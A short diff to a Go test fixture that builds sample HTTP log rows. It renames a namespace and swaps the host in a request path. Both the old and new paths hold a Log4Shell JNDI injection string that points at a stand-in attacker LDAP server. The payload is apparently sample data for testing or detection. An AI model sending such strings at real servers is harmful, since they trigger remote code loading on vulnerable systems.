@@ -64,7 +64,7 @@ func sampleHTTPRow(i int) map[string]any {
 	return map[string]any{
 		"time_":          time.Unix(0, int64(1_700_000_000_000_000_000+i)).UTC(),
 		"upid":           "0000000100000000-00000000-0000000000000042",
-		"namespace":      "log4j-poc",
+		"namespace":      "svc-poc",
 		"pod":            "backend-vulnerable-779cd9d765-mxr8t",
 		"remote_addr":    "10.0.0.45",
 		"remote_port":    int64(54321),
@@ -77,7 +77,7 @@ func sampleHTTPRow(i int) map[string]any {
 		"content_type":   int64(0),
 		"req_headers":    `{"Content-Type":"application/json"}`,
 		"req_method":     "POST",
-		"req_path":       "/api/v1/${jndi:ldap://attacker/Payload}",
+		"req_path":       "/api/v1/${jndi:ldap://evil.example/Payload}",
 		"req_body":       `{"id":42}`,
 		"req_body_size":  int64(9),
 		"resp_headers":   `{"Content-Type":"application/json"}`,
